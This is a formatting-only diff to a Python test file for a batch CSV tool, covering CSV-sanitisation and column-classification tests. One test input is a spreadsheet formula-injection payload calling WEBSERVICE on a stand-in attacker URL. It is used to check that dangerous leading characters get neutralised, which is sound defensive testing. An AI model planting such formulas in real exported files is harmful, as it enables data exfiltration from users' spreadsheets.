@@ -29,7 +29,7 @@ from primr.core.cli_batch import (
 class TestCsvSafe:
     @pytest.mark.parametrize("lead", list(_DANGEROUS_LEAD_CHARS))
     def test_dangerous_leads_get_quote_prefix(self, lead):
-        result = _csv_safe(f"{lead}WEBSERVICE(\"https://attacker\")")
+        result = _csv_safe(f'{lead}WEBSERVICE("https://attacker")')
         assert result.startswith("'")
 
     def test_safe_strings_unchanged(self):
@@ -151,7 +151,9 @@ class TestClassifyColumns:
 
     def test_unknown_company_column_falls_back(self):
         df = pd.DataFrame({"Company": ["A"], "Other": ["B"]})
-        response = '{"company_name": "DoesNotExist", "website": null, "industry": null, "context": []}'
+        response = (
+            '{"company_name": "DoesNotExist", "website": null, "industry": null, "context": []}'
+        )
         with patch("primr.ai.llm.llm", return_value=response):
             result = _classify_columns(df)
         # Should pick the "Company" candidate from the fallback list
@@ -249,7 +251,9 @@ class TestPrepareBatchDf:
     def test_industry_filter_without_industry_column_raises(self, tmp_path):
         path = tmp_path / "data.csv"
         path.write_text("Account Name\nExampleCo\n", encoding="utf-8")
-        response = '{"company_name": "Account Name", "website": null, "industry": null, "context": []}'
+        response = (
+            '{"company_name": "Account Name", "website": null, "industry": null, "context": []}'
+        )
         with patch("primr.ai.llm.llm", return_value=response):  # noqa: SIM117
             with pytest.raises(SystemExit):
                 _prepare_batch_df(str(path), industry="tech")
